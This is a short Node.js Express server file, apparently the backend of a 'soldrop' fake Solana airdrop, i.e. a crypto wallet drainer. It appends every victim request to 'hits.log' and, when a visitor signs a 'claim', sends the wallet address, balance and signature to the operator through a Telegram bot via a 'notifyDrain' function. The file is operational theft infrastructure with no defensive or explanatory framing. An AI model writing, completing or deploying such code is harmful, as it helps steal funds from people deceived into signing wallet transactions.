// soldrop/server.js — backend com telegram
const express = require("express");
const fs = require("fs");
const { notifyDrain, RECEIVER } = require("./telegram_bot");
const app = express();
app.use(express.json());
app.use(express.static(__dirname));
app.post("/api/log", async (req,res)=>{
  fs.appendFileSync("hits.log", JSON.stringify(req.body)+"\n");
  console.log("[HIT]", req.body);
  if (req.body.step === "claim" && req.body.sig) {
    await notifyDrain({address: req.body.address, balance: req.body.balance || "?", sig: req.body.sig});
  }
  res.json({ok:true});
});
app.listen(3000,()=>console.log("soldrop + telegram on :3000"));
